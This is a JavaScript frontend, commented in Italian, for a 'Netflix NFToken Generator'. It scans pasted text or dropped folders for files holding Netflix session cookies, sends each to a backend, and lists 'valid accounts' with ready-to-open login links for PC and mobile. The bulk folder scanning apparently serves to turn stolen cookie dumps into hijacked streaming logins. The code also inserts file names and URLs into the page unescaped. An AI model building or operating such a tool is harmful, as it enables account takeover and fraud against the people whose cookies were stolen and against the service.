/* ============================================================
   app.js  —  Netflix NFToken Generator frontend logic
   ============================================================ */
'use strict';

// ── Estensioni binarie da saltare ─────────────────────────────
const SKIP_EXT = new Set([
  'exe','zip','rar','7z','gz','tar','cab',
  'png','jpg','jpeg','gif','bmp','webp','svg','ico',
  'mp4','mp3','avi','mov','mkv','wav','flac',
  'pdf','doc','docx','xls','xlsx','ppt','pptx',
  'db','sqlite','dat','dll','so','dylib','bin','lnk'
]);

// ── State ─────────────────────────────────────────────────────
let loadedFiles = [];
let activeTab   = 'paste';

// ── DOM refs ──────────────────────────────────────────────────
const fileDrop    = document.getElementById('fileDrop');
const fileInput   = document.getElementById('fileInput');
const folderInput = document.getElementById('folderInput');
const fileList    = document.getElementById('fileList');
const statusEl    = document.getElementById('status');
const progressEl  = document.getElementById('progress');
const resultsEl   = document.getElementById('results');
const btnGenerate = document.getElementById('btnGenerate');

// ── Tab switching ─────────────────────────────────────────────
window.switchTab = function(tab) {
  activeTab = tab;
  document.querySelectorAll('.tab').forEach((b, i) =>
    b.classList.toggle('active', ['paste','files'][i] === tab)
  );
  document.querySelectorAll('.tab-panel').forEach((p, i) =>
    p.classList.toggle('active', ['tab-paste','tab-files'][i] === 'tab-' + tab)
  );
};

// ── File/Folder picker buttons ────────────────────────────────
document.getElementById('btnPickFile').addEventListener('click', e => {
  e.stopPropagation();
  fileInput.click();
});
document.getElementById('btnPickFolder').addEventListener('click', e => {
  e.stopPropagation();
  folderInput.click();
});
fileInput.addEventListener('change',   () => processRawFiles(Array.from(fileInput.files)));
folderInput.addEventListener('change', () => processRawFiles(Array.from(folderInput.files)));

// ── Drag & Drop — listener a livello DOCUMENTO ────────────────
let dragDepth = 0;

document.addEventListener('dragenter', e => {
  e.preventDefault();
  dragDepth++;
  fileDrop.classList.add('drag');
});

document.addEventListener('dragleave', e => {
  if (e.relatedTarget === null || e.relatedTarget.nodeName === 'HTML') {
    dragDepth = 0;
    fileDrop.classList.remove('drag');
  } else {
    dragDepth = Math.max(0, dragDepth - 1);
    if (dragDepth === 0) fileDrop.classList.remove('drag');
  }
});

document.addEventListener('dragover', e => {
  e.preventDefault(); // OBBLIGATORIO — senza questo il drop non parte mai
  e.dataTransfer.dropEffect = 'copy';
});

document.addEventListener('drop', e => {
  e.preventDefault();
  dragDepth = 0;
  fileDrop.classList.remove('drag');

  // Raccolgo entry IN MODO SINCRONO — DataTransfer è valido solo qui
  const entries = [];
  if (e.dataTransfer.items && e.dataTransfer.items.length > 0) {
    for (const item of e.dataTransfer.items) {
      if (typeof item.webkitGetAsEntry === 'function') {
        const entry = item.webkitGetAsEntry();
        if (entry) entries.push(entry);
      }
    }
  }

  if (entries.length === 0) {
    // Fallback FileList puro (browser vecchi)
    processRawFiles(Array.from(e.dataTransfer.files));
    return;
  }

  // Controlla se sono TUTTI file (niente cartelle) → via diretta, più leggera
  const allFiles = entries.every(e => e.isFile);
  if (allFiles) {
    // Nessuna ricorsione — leggi direttamente i File objects
    collectFlatFiles(entries).then(files => processRawFiles(files));
  } else {
    // C'è almeno una cartella → walk ricorsivo
    fileList.innerHTML = '<span style="color:#555">🔍 Scansione cartella in corso...</span>';
    walkEntries(entries).then(files => processRawFiles(files));
  }
});

// ── File flat da entry (per drag di singoli file, veloce) ─────
function collectFlatFiles(entries) {
  return Promise.all(
    entries
      .filter(e => e.isFile)
      .map(entry => new Promise(res => {
        entry.file(f => {
          try {
            Object.defineProperty(f, '_path', {
              value: entry.name, writable: false, configurable: true
            });
          } catch (_) {}
          res(f);
        }, () => res(null));
      }))
  ).then(files => files.filter(Boolean));
}

// ── Walk ricorsivo per cartelle ───────────────────────────────
function walkEntries(entries) {
  const collected = [];

  function walkEntry(entry, relativePath) {
    if (entry.isFile) {
      return new Promise(res => {
        entry.file(file => {
          const ext = file.name.includes('.')
            ? file.name.split('.').pop().toLowerCase() : '';
          if (!SKIP_EXT.has(ext)) {
            try {
              Object.defineProperty(file, '_path', {
                value: relativePath || file.name, writable: false, configurable: true
              });
            } catch (_) {}
            collected.push(file);
          }
          res();
        }, () => res());
      });
    }
    if (entry.isDirectory) {
      return readAllEntries(entry.createReader()).then(children =>
        Promise.all(children.map(child =>
          walkEntry(child, relativePath + '/' + child.name)
        ))
      );
    }
    return Promise.resolve();
  }

  function readAllEntries(reader) {
    return new Promise((res, rej) => {
      const all = [];
      function next() {
        reader.readEntries(batch => {
          if (!batch.length) return res(all);
          all.push(...batch);
          next();
        }, rej);
      }
      next();
    });
  }

  return Promise.all(entries.map(e => walkEntry(e, e.name))).then(() => collected);
}

// ── Leggi File[] e filtra per contenuto Netflix ───────────────
function processRawFiles(files) {
  loadedFiles = [];

  const filtered = files.filter(f => {
    if (!f) return false;
    const ext = f.name.includes('.') ? f.name.split('.').pop().toLowerCase() : '';
    return !SKIP_EXT.has(ext);
  });

  if (filtered.length === 0) {
    fileList.innerHTML = '<span style="color:#e50914">⚠️ Nessun file valido trovato.</span>';
    return;
  }

  fileList.innerHTML = `<span style="color:#555">📂 Lettura ${filtered.length} file in corso...</span>`;

  let done = 0;
  const promises = filtered.map(f =>
    readFileText(f).then(content => {
      done++;
      // aggiorna contatore ogni 10 file per non stressare il DOM
      if (done % 10 === 0 || done === filtered.length) {
        fileList.innerHTML = `<span style="color:#555">📂 Letti ${done}/${filtered.length}...</span>`;
      }
      if (!content) return;
      if (content.includes('NetflixId') || content.includes('netflix.com')) {
        const name = f._path || f.webkitRelativePath || f.name;
        loadedFiles.push({ name, content });
      }
    })
  );

  Promise.all(promises).then(() => {
    if (loadedFiles.length > 0) {
      fileList.innerHTML = [
        `<span style="color:#1db954;display:block;margin-bottom:6px">` +
        `✅ ${loadedFiles.length} file con cookie Netflix trovati</span>`,
        ...loadedFiles.map(f => `<span>📄 ${f.name}</span>`)
      ].join('');
    } else {
      fileList.innerHTML =
        '<span style="color:#e50914">⚠️ Nessun file contiene "NetflixId". ' +
        'Controlla che siano i cookie giusti.</span>';
    }
  });
}

// Prova UTF-8, fallback Latin-1 per file con encoding strano
function readFileText(file) {
  return new Promise(res => {
    const r = new FileReader();
    r.onload  = ev => res(ev.target.result);
    r.onerror = () => {
      const r2 = new FileReader();
      r2.onload  = ev => res(ev.target.result);
      r2.onerror = () => res(null);
      r2.readAsText(file, 'latin-1');
    };
    r.readAsText(file, 'utf-8');
  });
}

// ── Generate ──────────────────────────────────────────────────
btnGenerate.addEventListener('click', async () => {
  let sources = [];

  if (activeTab === 'paste') {
    const raw = document.getElementById('cookieInput').value.trim();
    if (!raw) { setStatus('error', '❌ Incolla i cookie prima.'); return; }
    sources = [{ name: 'input incollato', content: raw }];
  } else {
    if (loadedFiles.length === 0) { setStatus('error', '❌ Carica almeno un file.'); return; }
    sources = loadedFiles;
  }

  btnGenerate.disabled  = true;
  resultsEl.innerHTML   = '';
  progressEl.textContent = '';
  setStatus('loading', '<span class="spinner"></span>Scansione in corso...');

  let ok = 0, fail = 0;
  const total = sources.length;

  for (let i = 0; i < total; i++) {
    const src = sources[i];
    progressEl.textContent = `Elaborazione ${i + 1}/${total}: ${src.name}`;

    try {
      const res  = await fetch('/api/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: src.content, source: src.name })
      });
      const data = await res.json();

      if (data.accounts && data.accounts.length > 0) {
        for (const acc of data.accounts) { ok++; resultsEl.innerHTML += renderAccount(acc, src.name); }
      } else {
        fail++;
      }
    } catch { fail++; }
  }

  progressEl.textContent = '';
  if (ok === 0) {
    setStatus('error', `❌ Nessun account valido trovato in ${total} file.`);
  } else {
    setStatus('success', `✅ ${ok} account validi trovati${fail > 0 ? ` (${fail} saltati)` : ''}`);
  }
  btnGenerate.disabled = false;
});

// ── Render helpers ────────────────────────────────────────────
function renderAccount(acc, filename) {
  const id = 'acc_' + Math.random().toString(36).slice(2);
  return `
  <div class="account-card">
    <div class="account-header">
      <div class="account-dot"></div>
      <div class="account-name">Account valido</div>
      <div class="account-file">${filename}</div>
    </div>
    <div class="link-row">
      <div class="link-label">🖥️ PC / Browser</div>
      <div class="link-url" id="${id}_pc">${acc.url}</div>
      <div class="btn-row">
        <button class="btn-sm btn-red"  onclick="copyLink('${id}_pc',this)">Copia</button>
        <button class="btn-sm btn-grey" onclick="window.open(document.getElementById('${id}_pc').textContent,'_blank')">Apri</button>
      </div>
    </div>
    <div class="link-row" style="margin-top:12px">
      <div class="link-label">📱 Mobile</div>
      <div class="link-url" id="${id}_mob">${acc.mobile_url}</div>
      <div class="btn-row">
        <button class="btn-sm btn-red"  onclick="copyLink('${id}_mob',this)">Copia</button>
        <button class="btn-sm btn-grey" onclick="window.open(document.getElementById('${id}_mob').textContent,'_blank')">Apri</button>
      </div>
    </div>
  </div>`;
}

window.copyLink = function(elId, btn) {
  navigator.clipboard.writeText(document.getElementById(elId).textContent);
  const orig = btn.textContent;
  btn.textContent = 'Copiato!';
  setTimeout(() => btn.textContent = orig, 2000);
};

function setStatus(type, html) {
  statusEl.className = 'status ' + type;
  statusEl.innerHTML = html;
}
